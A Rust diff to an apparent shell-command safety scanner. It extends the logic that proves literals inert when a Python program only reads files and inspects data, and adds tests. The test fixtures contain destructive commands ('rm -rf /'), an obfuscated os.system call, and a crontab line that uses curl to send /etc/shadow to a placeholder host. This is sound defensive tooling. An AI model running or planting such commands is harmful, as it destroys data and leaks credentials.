@@ -25,9 +25,20 @@ use std::time::{Duration, Instant};
 enum DocumentationValue {
     Text,
     Scalar,
+    Collection,
+    ReadOnlyFile,
     File,
     NodeFs,
     JavaScriptRegex,
+}
+
+impl DocumentationValue {
+    /// Built-in values whose comparisons, truth tests and printing cannot
+    /// dispatch to a user-supplied callable. Collections contain only these
+    /// same values; file and module capabilities must never escape as data.
+    const fn is_data(self) -> bool {
+        matches!(self, Self::Text | Self::Scalar | Self::Collection)
+    }
 }
 
 /// Literal ranges whose shell-looking bytes retain a proven data role (#544).
@@ -42,15 +53,27 @@ enum DocumentationValue {
 /// consumers, and keep the ORIGINAL source in execution/protected-write scans.
 /// Parsing must run inside the caller's bounded optional-proof worker.
 ///
-/// A proved program that opens no file can only compute text and print it to
-/// the caller, so every literal it contains is data and all of them are
-/// returned (#586): a printed string that spells a shell command runs
-/// nothing. A program that opens a file can write a literal where something
-/// later runs it (a crontab, a shell profile, a package manifest), so only its
-/// substitution-shaped literals are returned, as before.
+/// A proved program that cannot write files can only inspect data and print
+/// it to the caller, so every literal it contains is data and all of them
+/// are returned (#586, #645). A file opened with a writable or unknown mode
+/// can store a literal where something later runs it (a crontab, a shell
+/// profile, a package manifest), so only substitution-shaped literals are
+/// returned for such a program, as before.
 pub(crate) fn inert_documentation_literal_ranges(
     code: &str,
     language: ScriptLanguage,
+) -> Vec<std::ops::Range<usize>> {
+    inert_documentation_literal_ranges_with_data_inspection(code, language, true)
+}
+
+/// Extend the established documentation proof only when the caller retains
+/// the interpreter's complete containing source. An extracted shell leaf can
+/// lose a function binding, pipeline or later consumer; it must keep the
+/// pre-#645 proof instead of acquiring new inspection-data exemptions.
+pub(crate) fn inert_documentation_literal_ranges_with_data_inspection(
+    code: &str,
+    language: ScriptLanguage,
+    allow_data_inspection: bool,
 ) -> Vec<std::ops::Range<usize>> {
     let has_substitution_text = code.contains('`') || code.contains("$(");
     let _phase = crate::perf::phase(crate::perf::ProfilePhase::AstMatch);
@@ -59,8 +82,9 @@ pub(crate) fn inert_documentation_literal_ranges(
     };
     let root = ast.root();
     let mut proof = DocumentationProof::new(language, 128, 16_384);
+    proof.allow_data_inspection = allow_data_inspection;
     if proof.expression(&root, 0).is_some() {
-        if proof.opens_files {
+        if proof.may_write_files {
             proof.literals
         } else {
             proof.data_literals
@@ -108,6 +132,10 @@ fn documentation_ast(
 
 struct DocumentationProof {
     language: ScriptLanguage,
+    /// #645's extra pure expressions and read-only file distinction require
+    /// an explicit containing-source proof. Other users retain the established
+    /// documentation proof by default, including literal-shell recovery.
+    allow_data_inspection: bool,
     values: std::collections::BTreeMap<String, DocumentationValue>,
     /// How many names the proof may bind before it gives up.
     max_values: usize,
@@ -115,9 +143,10 @@ struct DocumentationProof {
     literals: Vec<std::ops::Range<usize>>,
     /// Every literal, substitution-shaped or not (#586).
     data_literals: Vec<std::ops::Range<usize>>,
-    /// Whether the program opens a file (Python `open`, Node `fs`), and so
-    /// can put a literal where something else later executes it.
-    opens_files: bool,
+    /// Whether a file capability can put a literal where something else
+    /// later executes it. The established proof treats every open this way;
+    /// the inspection extension can prove a Python file is read-only.
+    may_write_files: bool,
     remaining_steps: usize,
 }
 
@@ -125,11 +154,12 @@ impl DocumentationProof {
     const fn new(language: ScriptLanguage, max_values: usize, remaining_steps: usize) -> Self {
         Self {
             language,
+            allow_data_inspection: false,
             values: std::collections::BTreeMap::new(),
             max_values,
             literals: Vec::new(),
             data_literals: Vec::new(),
-            opens_files: false,
+            may_write_files: false,
             remaining_steps,
         }
     }
@@ -228,6 +258,60 @@ impl DocumentationProof {
                 }
                 Some(Text)
             }
+            "list" | "tuple" | "tuple_expression" | "set" | "dictionary"
+                if self.allow_data_inspection && self.language == ScriptLanguage::Python =>
+            {
+                for child in &named {
+                    if child.kind().as_ref() == "pair" {
+                        for field in ["key", "value"] {
+                            if !self.expression(&child.field(field)?, depth + 1)?.is_data() {
+                                return None;
+                            }
+                        }
+                    } else if !self.expression(child, depth + 1)?.is_data() {
+                        return None;
+                    }
+                }
+                Some(DocumentationValue::Collection)
+            }
+            "comparison_operator"
+                if self.allow_data_inspection && self.language == ScriptLanguage::Python =>
+            {
+                // Comparisons and membership can call user code on an opaque
+                // operand. Only concrete built-in data, including every
+                // operand of a chained comparison, earns this proof.
+                if named.len() < 2 {
+                    return None;
+                }
+                for operand in &named {
+                    if !self.expression(operand, depth + 1)?.is_data() {
+                        return None;
+                    }
+                }
+                Some(Scalar)
+            }
+            "boolean_operator"
+                if self.allow_data_inspection && self.language == ScriptLanguage::Python =>
+            {
+                // Python's and/or return an operand, not a bool. Preserve
+                // its type and inspect both branches instead of guessing
+                // which one runs or converting a capability into a scalar.
+                let left = self.expression(&node.field("left")?, depth + 1)?;
+                let right = self.expression(&node.field("right")?, depth + 1)?;
+                (left == right && left.is_data()).then_some(left)
+            }
+            "not_operator"
+                if self.allow_data_inspection && self.language == ScriptLanguage::Python =>
+            {
+                self.expression(&node.field("argument")?, depth + 1)?
+                    .is_data()
+                    .then_some(Scalar)
+            }
+            "unary_operator"
+                if self.allow_data_inspection && self.language == ScriptLanguage::Python =>
+            {
+                (self.expression(&node.field("argument")?, depth + 1)? == Scalar).then_some(Scalar)
+            }
             "binary_operator" | "binary_expression" => {
                 let left = self.expression(&node.field("left")?, depth + 1)?;
                 let right = self.expression(&node.field("right")?, depth + 1)?;
@@ -253,7 +337,9 @@ impl DocumentationProof {
         node: &ast_grep_core::Node<'_, D>,
         depth: usize,
     ) -> Option<DocumentationValue> {
-        use DocumentationValue::{File, JavaScriptRegex, NodeFs, Scalar, Text};
+        use DocumentationValue::{
+            Collection, File, JavaScriptRegex, NodeFs, ReadOnlyFile, Scalar, Text,
+        };
         if depth >= 64 {
             return None;
         }
@@ -276,7 +362,7 @@ impl DocumentationProof {
             };
             if value == JavaScriptRegex && index == 0 && args.len() == 2 {
                 regex_search = true;
-            } else if !matches!(value, Text | Scalar) || (regex_search && value != Text) {
+            } else if !value.is_data() || (regex_search && value != Text) {
                 return None; // capabilities may not escape; a replacement must be text
             }
         }
@@ -314,13 +400,48 @@ impl DocumentationProof {
                             _ => false,
                         }
                     });
-                    self.opens_files = true;
-                    (positional <= 3 && plain_options).then_some(File)
+                    if positional > 3 || !plain_options {
+                        return None;
+                    }
+                    if !self.allow_data_inspection {
+                        // Preserve #544/#586 behavior when a nested caller
+                        // cannot retain all of the interpreter's consumers.
+                        self.may_write_files = true;
+                        return Some(File);
+                    }
+                    let positional_mode = args
+                        .iter()
+                        .filter(|arg| arg.kind().as_ref() != "keyword_argument")
+                        .nth(1)
+                        .cloned();
+                    let mut mode = positional_mode;
+                    for argument in &args {
+                        if argument.kind().as_ref() == "keyword_argument"
+                            && argument
+                                .field("name")
+                                .is_some_and(|name| name.text() == "mode")
+                        {
+                            if mode.is_some() {
+                                return None;
+                            }
+                            mode = Some(argument.field("value")?);
+                        }
+                    }
+                    // Missing mode means Python's read-only default. A
+                    // runtime value, even a proved text variable, cannot
+                    // establish that the file was not opened for writing.
+                    let read_only = mode.is_none_or(|mode| {
+                        static_interpreter_literal(&mode, ScriptLanguage::Python, 0).is_some_and(
+                            |mode| matches!(mode.as_str(), "r" | "rt" | "tr" | "rb" | "br"),
+                        )
+                    });
+                    self.may_write_files |= !read_only;
+                    Some(if read_only { ReadOnlyFile } else { File })
                 }
                 (ScriptLanguage::JavaScript, "require") if args.len() == 1 => {
                     // No computed module names or preloaded application code.
                     let literal = args[0].text();
-                    self.opens_files = true;
+                    self.may_write_files = true;
                     matches!(
                         literal.as_ref(),
                         "'fs'" | "\"fs\"" | "'node:fs'" | "\"node:fs\""
@@ -359,7 +480,20 @@ impl DocumentationProof {
                 | "removeprefix" | "removesuffix" | "trim" | "trimStart" | "trimEnd"
                 | "toLowerCase" | "toUpperCase",
             ) => Some(Text),
-            (File, "read") => Some(Text),
+            (Text, "startswith" | "endswith" | "find" | "rfind" | "index" | "rindex" | "count")
+                if self.allow_data_inspection && self.language == ScriptLanguage::Python =>
+            {
+                Some(Scalar)
+            }
+            (Text, "split" | "rsplit" | "splitlines")
+                if self.allow_data_inspection && self.language == ScriptLanguage::Python =>
+            {
+                Some(Collection)
+            }
+            (File | ReadOnlyFile, "read") => Some(Text),
+            (File | ReadOnlyFile, "readline") if self.allow_data_inspection => Some(Text),
+            (File | ReadOnlyFile, "readlines") if self.allow_data_inspection => Some(Collection),
+            (ReadOnlyFile, "close") => Some(Scalar),
             (File, "write" | "close" | "flush") => Some(Scalar),
             (NodeFs, "readFileSync") => Some(Text),
             (NodeFs, "writeFileSync" | "appendFileSync") => Some(Scalar),
@@ -2660,8 +2794,8 @@ mod tests {
                     .is_some_and(|text| text.contains('`'))),
                 "the substitution-shaped literal is data: {source}"
             );
-            // A program that opens a file keeps its other literals in the scan;
-            // one that only prints has every literal proved (#586).
+            // These file-editing programs keep their other literals in the
+            // scan; a program that only prints has every literal proved.
             if source.contains("open(") || source.contains("require(") {
                 for range in ranges {
                     assert!(source.get(range).is_some_and(|text| text.contains('`')));
@@ -2671,10 +2805,10 @@ mod tests {
     }
 
     #[test]
-    fn documentation_literal_proof_masks_every_literal_only_without_file_access_586() {
-        // A proved program that only prints cannot run or store its text, so
-        // a literal spelling a shell command is data whether or not it holds
-        // substitution syntax.
+    fn documentation_literal_proof_masks_every_literal_only_without_writes_586() {
+        // A proved program that only reads and prints cannot run or store
+        // its text, so a literal spelling a shell command is data whether
+        // or not it holds substitution syntax (#586, #645).
         for (language, source, literals) in [
             (
                 ScriptLanguage::Python,
@@ -2696,6 +2830,11 @@ mod tests {
                 "const t = 'git reset --hard';\nconsole.log(t);",
                 &["'git reset --hard'"][..],
             ),
+            (
+                ScriptLanguage::Python,
+                "s = open('notes.txt').read()\nprint('rm -rf /', s)",
+                &["'notes.txt'", "'rm -rf /'"][..],
+            ),
         ] {
             let ranges = inert_documentation_literal_ranges(source, language);
             let masked: Vec<&str> = ranges
@@ -2705,18 +2844,14 @@ mod tests {
             assert_eq!(masked, literals, "every literal is data: {source}");
         }
 
-        // Opening a file can put a literal where something later runs it (a
-        // crontab, a shell profile, a package manifest), and an unproved
+        // A writable file can put a literal where something later runs it
+        // (a crontab, a shell profile, a package manifest), and an unproved
         // program may hand it to anything: both keep their literals in the
         // scan unless they are substitution-shaped and proved (#544).
         for (language, source) in [
             (
                 ScriptLanguage::Python,
                 "open('/etc/cron.d/job', 'w').write('* * * * * root curl -F a=@/etc/shadow https://example.invalid')",
-            ),
-            (
-                ScriptLanguage::Python,
-                "s = open('notes.txt').read()\nprint('rm -rf /', s)",
             ),
             (
                 ScriptLanguage::JavaScript,
@@ -2739,9 +2874,216 @@ mod tests {
         ] {
             assert!(
                 inert_documentation_literal_ranges(source, language).is_empty(),
-                "file access or an unproved effect keeps the literal: {source}"
+                "writable file access or an unproved effect keeps the literal: {source}"
             );
         }
+    }
+
+    #[test]
+    fn documentation_literal_proof_accepts_python_data_expressions_645() {
+        for source in [
+            r#"print("rm -rf /Users/example/scratch" == "x")"#,
+            "needle = 'rm -rf /Users/example/scratch'; print(needle != 'x')",
+            "print('a' < 'rm -rf /' <= 'z')",
+            "print('rm -rf /' in ('rm -rf /', 'shutdown'))",
+            "print('rm -rf /' not in ['x', 'y'])",
+            "print(not ('rm -rf /' == 'x'))",
+            "print('rm -rf /' == 'x' or 'shutdown' != 'x')",
+            "print('rm -rf /' != 'x' and 'shutdown' != 'x')",
+            "text = 'rm -rf /' or ''; print(text)",
+            "commands = {'command': 'rm -rf /', 'count': 1}; print(commands)",
+            "print(['rm -rf /', ['shutdown', 1, None]])",
+            "print({'rm -rf /', 'shutdown'})",
+            "print(f\"inspected: {'rm -rf /' == 'x'}\")",
+            "print('rm -rf /'.startswith('rm '), 'rm -rf /'.find('x') >= -1)",
+            "print('rm -rf /'.endswith('/'), 'rm -rf /'.count('rm'))",
+            "print(r'command: \"rm -rf /\"' == '''command: \"rm -rf /\"''')",
+        ] {
+            let ranges = inert_documentation_literal_ranges(source, ScriptLanguage::Python);
+            assert!(
+                ranges.iter().any(|range| source
+                    .get(range.clone())
+                    .is_some_and(|literal| literal.contains("rm -rf /"))),
+                "a known data expression must retain its literal role: {source}"
+            );
+        }
+    }
+
+    #[test]
+    fn documentation_literal_proof_accepts_read_only_command_inspection_645() {
+        for source in [
+            "records = open('pending-exceptions.jsonl').read(); print('rm -rf /' in records)",
+            "records = open(file='pending-exceptions.jsonl').read(); print('rm -rf /' in records)",
+            "records = open('pending-exceptions.jsonl', 'r').read(); print('rm -rf /' in records)",
+            "records = open('pending-exceptions.jsonl', mode='rt', encoding='utf-8').read(); print('rm -rf /' in records)",
+            "records = open('pending-exceptions.jsonl', 'rb').read(); print(b'rm -rf /' in records)",
+            "records = open('pending-exceptions.jsonl', 'br').read(); print(b'rm -rf /' in records)",
+            "records = open('pending-exceptions.jsonl', 'tr').read(); print('rm -rf /' in records)",
+            "records = open('pending-exceptions.jsonl', '\\x72').read(); print('rm -rf /' in records)",
+            "f = open('pending-exceptions.jsonl'); records = f.read(); f.close(); print(records.find('rm -rf /'))",
+            "records = open('pending-exceptions.jsonl').read().splitlines(); print('rm -rf /' in records)",
+            "records = open('pending-exceptions.jsonl').readlines(); print('rm -rf /' in records)",
+            "record = open('pending-exceptions.jsonl').readline(); print(record.startswith('rm -rf /'))",
+        ] {
+            let ranges = inert_documentation_literal_ranges(source, ScriptLanguage::Python);
+            assert!(
+                ranges.iter().any(|range| source
+                    .get(range.clone())
+                    .is_some_and(|literal| literal.contains("rm -rf /"))),
+                "reading recorded commands must not turn their literals into shell code: {source}"
+            );
+        }
+    }
+
+    #[test]
+    fn documentation_literal_proof_keeps_writes_and_opaque_values_visible_645() {
+        for source in [
+            "open('job.sh', 'w').write('rm -rf /')",
+            "open('job.sh', 'a').write('rm -rf /')",
+            "open('job.sh', 'x').write('rm -rf /')",
+            "open('job.sh', 'r+').write('rm -rf /')",
+            "open('job.sh', 'rb+').write(b'rm -rf /')",
+            "records = open('job.sh', 'r+').read(); print('rm -rf /' in records)",
+            "mode = 'r'; records = open('job.sh', mode).read(); print('rm -rf /' in records)",
+            "mode = 'r'; records = open('job.sh', mode=mode).read(); print('rm -rf /' in records)",
+            "records = open('job.sh', encoding='custom_codec').read(); print('rm -rf /' in records)",
+            "records = open('job.sh', opener=run).read(); print('rm -rf /' in records)",
+            "records = open('job.sh', 'r', mode='r').read(); print('rm -rf /' in records)",
+            "open('job.sh').write('rm -rf /')",
+            "f = open('job.sh'); print('rm -rf /', file=f)",
+            "print('rm -rf /' == unknown)",
+            "print('rm -rf /' in unknown)",
+            "print('rm -rf /' == 'x' or run())",
+            "print('rm -rf /' == 'x' and run())",
+            "print(f'rm -rf / {run()}')",
+            "print(['rm -rf /', open('job.sh')])",
+            "print({'command': 'rm -rf /', 'runner': eval})",
+            "print(['rm -rf /', *values])",
+            "print({'command': 'rm -rf /', **values})",
+            "print([item for item in ['rm -rf /']])",
+            "print = run; print('rm -rf /')",
+            "import os; print('rm -rf /')",
+            "getattr(__import__('os'), 'system')('rm -rf /')",
+        ] {
+            assert!(
+                inert_documentation_literal_ranges(source, ScriptLanguage::Python).is_empty(),
+                "a write or unproved capability must retain conservative analysis: {source}"
+            );
+        }
+    }
+
+    #[test]
+    fn documentation_literal_proof_requires_context_for_new_data_operations_645() {
+        for source in [
+            "print('git reset --hard' == 'x')",
+            "print('git reset --hard' in ['git reset --hard'])",
+            "print('git reset --hard' or '')",
+            "print(not 'git reset --hard')",
+            "print('git reset --hard', -1)",
+            "print({'command': 'git reset --hard'})",
+            "open('notes.txt').read(); print('git reset --hard')",
+            "open('notes.txt', 'r').read(); print('git reset --hard')",
+            "f = open('notes.txt'); f.close(); print('git reset --hard')",
+            "print('git reset --hard'.startswith('git'))",
+            "print('git reset --hard'.endswith('hard'))",
+            "print('git reset --hard'.find('git'))",
+            "print('git reset --hard'.rfind('git'))",
+            "print('git reset --hard'.index('git'))",
+            "print('git reset --hard'.rindex('git'))",
+            "print('git reset --hard'.count('git'))",
+            "print('git reset --hard'.split(' '))",
+            "print('git reset --hard'.rsplit(' '))",
+            "print('git reset --hard'.splitlines())",
+            "open('notes.txt').readline(); print('git reset --hard')",
+            "open('notes.txt').readlines(); print('git reset --hard')",
+        ] {
+            let proved = inert_documentation_literal_ranges_with_data_inspection(
+                source,
+                ScriptLanguage::Python,
+                true,
+            );
+            assert!(
+                proved.iter().any(|range| source
+                    .get(range.clone())
+                    .is_some_and(|literal| literal.contains("git reset --hard"))),
+                "complete source may prove inspection data: {source}"
+            );
+            assert!(
+                inert_documentation_literal_ranges_with_data_inspection(
+                    source,
+                    ScriptLanguage::Python,
+                    false,
+                )
+                .is_empty(),
+                "a detached leaf must not gain a new data proof: {source}"
+            );
+        }
+    }
+
+    #[test]
+    fn documentation_literal_proof_retains_established_data_masks_645() {
+        for (language, source) in [
+            (
+                ScriptLanguage::Python,
+                "print('use `git reset --hard` with care')",
+            ),
+            (
+                ScriptLanguage::Python,
+                "print('run $(git reset --hard) later')",
+            ),
+            (
+                ScriptLanguage::Python,
+                "s = '`git reset --hard`'; open('README.md', 'w').write(s)",
+            ),
+            (
+                ScriptLanguage::JavaScript,
+                "console.log('use `git reset --hard` with care');",
+            ),
+            (
+                ScriptLanguage::JavaScript,
+                "const fs = require('fs'); fs.writeFileSync('README.md', '`git reset --hard`');",
+            ),
+        ] {
+            let established =
+                inert_documentation_literal_ranges_with_data_inspection(source, language, false);
+            assert!(
+                !established.is_empty(),
+                "the established proof must survive: {source}"
+            );
+            assert_eq!(
+                established,
+                inert_documentation_literal_ranges_with_data_inspection(source, language, true),
+                "#544 documentation keeps its existing behavior: {source}"
+            );
+        }
+
+        let source = "s = open('notes.txt').read(); print('run $(git reset --hard) later', s)";
+        let established = inert_documentation_literal_ranges_with_data_inspection(
+            source,
+            ScriptLanguage::Python,
+            false,
+        );
+        let literals: Vec<_> = established
+            .iter()
+            .filter_map(|range| source.get(range.clone()))
+            .collect();
+        assert_eq!(literals, ["'run $(git reset --hard) later'"]);
+    }
+
+    #[test]
+    fn interpreter_literal_recovery_retains_established_proof_by_default_645() {
+        let commands = interpreter_literal_shell_commands_inner(
+            "print('$(git reset --hard)' or '')",
+            ScriptLanguage::Python,
+            true,
+        )
+        .expect("the complete program is valid Python");
+        assert!(
+            commands
+                .iter()
+                .any(|command| command.command.contains("git reset --hard")),
+            "recovery's established proof must not acquire the new boolean exemption"
+        );
     }
 
     #[test]
